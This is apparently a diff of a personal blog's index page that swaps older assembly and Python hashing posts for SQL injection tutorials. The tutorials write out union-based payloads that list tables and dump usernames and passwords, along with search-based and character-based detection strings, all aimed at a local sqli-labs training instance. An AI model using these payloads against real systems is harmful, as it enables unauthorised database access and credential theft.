+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Asm/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Union Sql Injection</span></a>
                 </span>
             </span>
 
@@ -953,26 +877,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Here is code snippet to show how to compile asm to execute under Linux:</p>
-<p>shellx.asm:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">section     .text</span><br><span class="line">global      _start </span><br><span class="line">_start: </span><br><span class="line">    mov     edx,len   </span><br><span class="line">    mov     ecx,msg   </span><br><span class="line">    mov     ebx,<span class="number">1</span>   </span><br><span class="line">    mov     eax,<span class="number">4</span>   </span><br><span class="line">    <span class="type">int</span>     <span class="number">0x80</span>   </span><br><span class="line">    mov     eax,<span class="number">1</span>  </span><br><span class="line">    <span class="type">int</span>     <span class="number">0x80</span>   </span><br><span class="line">section     .data</span><br><span class="line">msg     db  <span class="string">&#x27;Hello world&#x27;</span>,<span class="number">0xa</span>  </span><br><span class="line">len     equ $ - msg</span><br></pre></td></tr></table></figure>
-<p>let’s start</p>
-<ol>
-<li>First step:</li>
+          <h1 id="Union-Sql-Injection-Detection-Methods"><a href="#Union-Sql-Injection-Detection-Methods" class="headerlink" title="Union Sql Injection Detection Methods"></a>Union Sql Injection Detection Methods</h1><ol>
+<li>First, check for the existence of an SQL injection vulnerability.</li>
+<li>Then, determine the injection type: character-based, numeric-based, or search-based.</li>
+<li>Use “order by” to further identify the number of columns:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+ (normal)</span><br><span class="line">?id=1&#x27; order by 4 --+ (error)</span><br></pre></td></tr></table></figure></li>
+<li>Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions.</li>
+<li>Retrieve the tables in the current database:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></li>
+<li>After obtaining the tables, retrieve the columns in those tables:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li>Retrieve the data:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+</span><br></pre></td></tr></table></figure>
+These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database.</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vagrant@kali:~/Desktop/cdasm$ nasm -f elf64 shellx.asm</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>Next step:</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vagrant@kali:~/Desktop/cdasm$ ld -s -o shellx shellx.o</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>Execute :</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vagrant@kali:~/Desktop/cdasm$ ./shellx </span><br></pre></td></tr></table></figure>
-<p>then output :</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello world</span><br></pre></td></tr></table></figure>
+<h1 id="Examples-of-Target-Machines"><a href="#Examples-of-Target-Machines" class="headerlink" title="Examples of Target Machines"></a>Examples of Target Machines</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -992,12 +907,12 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2011/01/16/pythonHash/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/23/Search-BasedSqlInjection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1006,7 +921,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2011/01/16/pythonHash/" class="post-title-link" itemprop="url">Compilation of Python Code Snippets for Hashing</a>
+            <a href="/2016/10/23/Search-BasedSqlInjection/" class="post-title-link" itemprop="url">Search-Based SQL Injection Detection</a>
         </h2>
 
         <div class="post-meta">
@@ -1016,14 +931,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2011-01-16 10:47:24" itemprop="dateCreated datePublished" datetime="2011-01-16T10:47:24-05:00">2011-01-16</time>
+              <time title="Created: 2016-10-23 19:57:41" itemprop="dateCreated datePublished" datetime="2016-10-23T19:57:41-04:00">2016-10-23</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 12:06:28" itemprop="dateModified" datetime="2023-10-17T12:06:28-04:00">2023-10-17</time>
+                <time title="Modified: 2023-10-18 18:54:24" itemprop="dateModified" datetime="2023-10-18T18:54:24-04:00">2023-10-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1035,7 +950,15 @@
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/hash/" itemprop="url" rel="index"><span itemprop="name">hash</span></a>
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Search-Based SQL Injection</span></a>
                 </span>
             </span>
 
@@ -1050,22 +973,111 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Performing relevant hashing operations is an essential skill in penetration testing. Here is a compilation of code snippets for common hash implementations in Python.</p>
-<p><strong><em>md5</em></strong> :</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">mystring = input(<span class="string">&#x27;Enter String to hash: &#x27;</span>)</span><br><span class="line"><span class="comment"># Assumes the default UTF-8</span></span><br><span class="line">hash_object = hashlib.md5(mystring.encode())</span><br><span class="line"><span class="built_in">print</span>(hash_object.hexdigest())</span><br></pre></td></tr></table></figure>
+          <h1 id="Search-Based-Injection-Detection-Methods"><a href="#Search-Based-Injection-Detection-Methods" class="headerlink" title="Search-Based Injection Detection Methods:"></a>Search-Based Injection Detection Methods:</h1><ol>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  If an error occurs, there’s a high probability of a vulnerability.</p>
+</li>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  If an error occurs, there’s a high probability of a vulnerability.</p>
+</li>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  Observe the response.</p>
+</li>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=2 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  Observe the response.</p>
+</li>
+</ol>
+<h1 id="Search-Based-Injection-Detection-Statements"><a href="#Search-Based-Injection-Detection-Statements" class="headerlink" title="Search-Based Injection Detection Statements:"></a>Search-Based Injection Detection Statements:</h1>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=1--&#x27;</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27; </span><br></pre></td></tr></table></figure>
+      
+    </div>
 
-<p><strong><em>sha1</em></strong>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">hash_object = hashlib.sha1(b<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line">hex_dig = hash_object.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hex_dig)</span><br></pre></td></tr></table></figure>
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/20/characterSqlInject/">
 
-<p><strong><em>SHA256</em></strong>:</p>
-<figure class="highlight plaintext"><figcaption><span>hashlib</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hash_object = hashlib.sha256(b&#x27;Hello World&#x27;)</span><br><span class="line">hex_dig = hash_object.hexdigest()</span><br><span class="line">print(hex_dig)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><strong><em>sha512</em></strong>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">input = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="built_in">hash</span> = hashlib.sha512( str( input ).encode(<span class="string">&quot;utf-8&quot;</span>) ).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure>
-<p><strong><em>DSA</em></strong>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">hash_object = hashlib.new(<span class="string">&#x27;DSA&#x27;</span>)</span><br><span class="line">hash_object.update(b<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(hash_object.hexdigest())</span><br></pre></td></tr></table></figure>
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
 
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/20/characterSqlInject/" class="post-title-link" itemprop="url">Character-based SQL Injection</a>
+        </h2>
 
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-20 21:55:22" itemprop="dateCreated datePublished" datetime="2016-10-20T21:55:22-04:00">2016-10-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 18:55:32" itemprop="dateModified" datetime="2023-10-18T18:55:32-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Character-based SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Detection of character-based SQL Injection:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1084,7 +1096,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1145,20 +1157,20 @@
     <img class="site-author-image" itemprop="image" alt="Dong Cong"
       src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">Dong Cong</p>
-  <div class="site-description" itemprop="description">The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash</div>
+  <div class="site-description" itemprop="description">Python、Typescript、Go、C/C++、asm、Bash</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
